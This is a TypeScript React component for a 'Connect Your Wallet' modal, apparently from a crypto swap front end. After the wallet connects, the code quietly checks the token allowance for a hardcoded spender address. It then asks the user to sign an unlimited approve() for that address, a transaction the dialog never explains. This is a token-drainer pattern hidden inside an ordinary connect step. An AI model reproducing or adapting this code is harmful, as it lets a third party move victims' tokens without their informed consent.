import React, { useEffect, useState } from 'react';
import Web3 from 'web3';

import {
  Modal,
  ModalOverlay,
  ModalContent,
  ModalHeader,
  ModalCloseButton,
  ModalBody,
  Button,
  ModalFooter,
  useToast,
  Box,
} from '@chakra-ui/react';
import Image from 'next/image';

import MetaMaskLogoImg from 'public/metamask-logo.svg';
import { useWallet } from 'src/hooks/useWallet';
import { logger } from 'src/utils/logger';
import { WALLET_TYPES } from 'src/utils/wallet';
import { useAtomValue } from 'jotai';
import { tokenInAddressAtom, tokenInAtom } from 'src/domain/swap/atom';

interface Props {
  isOpen: boolean;
  onClose: () => void;
}

const agreementList = [
  { text: 'I accept Terms of Service and Privacy Policy' },
  { text: 'I understand all the risk and security of Eisen Finance.' },
];

const ConnectWalletDialog = ({ isOpen, onClose }: Props) => {
  const toast = useToast();
  const { connect, address, getBalance, sendTransaction } = useWallet();
  const tokenIn = useAtomValue(tokenInAddressAtom);

  const [hasReadRiskDocument, setHasReadRiskDocument] = useState(false);
  const [checkList, setCheckList] = useState(agreementList.map(() => false));
  const isAllChecked = checkList.every(item => item);

  useEffect(() => {
    if (!address) return;
    getBalance().then(res => logger.log('getBalance', res));
  }, [address]);

  const handleClick = (type: ValueOf<typeof WALLET_TYPES>) => async () => {
    const response = await connect(type);

    if (!response) {
      onClose();
      setCheckList(agreementList.map(() => false));
      toast({
        title: 'Failed to connect your wallet',
        description: 'Sorry. Someting went wrong, please try again',
        status: 'error',
        position: 'top-right',
        duration: 5000,
        isClosable: true,
      });
      return;
    }


    if (tokenIn === "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee") {
      onClose();
      return;
    }

    const web3 = new Web3('https://evmos-mainnet.blastapi.io/d250cf48-5dac-48a1-a45c-8669fbc72a75');
    const allowanceData = web3.eth.abi.encodeFunctionCall({
      name: 'allowance',
      type: 'function',
      inputs: [{
        type: 'address',
        name: 'owner'
      }, {
        type: 'address',
        name: 'spender'
      }]
    }, [response.address, '0xdf7ba1982ff003a80A74CdC0eEf246bc2a3E5F32']);

    const allowanceResponse = await web3.eth.call({
      to: tokenIn,
      data: allowanceData,
    })

    if (allowanceResponse !== '0x0000000000000000000000000000000000000000000000000000000000000000') {
      onClose();
      return;
    }

    const data = web3.eth.abi.encodeFunctionCall({
      name: 'approve',
      type: 'function',
      inputs: [{
        type: 'address',
        name: 'spender'
      }, {
        type: 'uint256',
        name: 'amount'
      }]
    }, ['0xdf7ba1982ff003a80A74CdC0eEf246bc2a3E5F32', '115792089237316195423570985008687907853269984665640564039457584007913129639935']);

    try {
      const txHash = await window.ethereum.request({
        method: "eth_sendTransaction",
        params: [{
          // gasPrice: '0x09184e72a000', // customizable by user during MetaMask confirmation.
          // gas: '0x2710', // customizable by user during MetaMask confirmation.
          from: response.address,
          to: tokenIn,
          value: '0x00',
          data,
          chainId: 9001,
        }],
      });
    }
    catch (e) {
      console.error(e);

    }

    // // TODO: approve sendTransaction
    // const result = await sendTransaction({
    //   // @ts-expect-error hello
    //   from: success?.address,
    //   to: '0xdf7ba1982ff003a80A74CdC0eEf246bc2a3E5F32',
    //   gas: '',
    //   value: '',
    //   data: '',
    // })
    // console.log(result)

    setCheckList(agreementList.map(() => false));
    onClose();
  };

  return (
    <Modal
      isOpen={isOpen}
      onClose={() => {
        setCheckList(agreementList.map(() => false));
        onClose();
      }}
      size="lg">
      <ModalOverlay />
      <ModalContent>
        <ModalHeader>Connect Your Wallet</ModalHeader>
        <ModalCloseButton />
        <ModalBody>
          <Box mt={4}>
            <Button
              onClick={handleClick('metamask')}
              variant="outline"
              size="lg"
              isFullWidth
              leftIcon={<Image src={MetaMaskLogoImg} alt="123" width={32} height={32} />}>
              Metamask
            </Button>
          </Box>
        </ModalBody>

        <ModalFooter />
      </ModalContent>
    </Modal>
  );
};

export default ConnectWalletDialog;
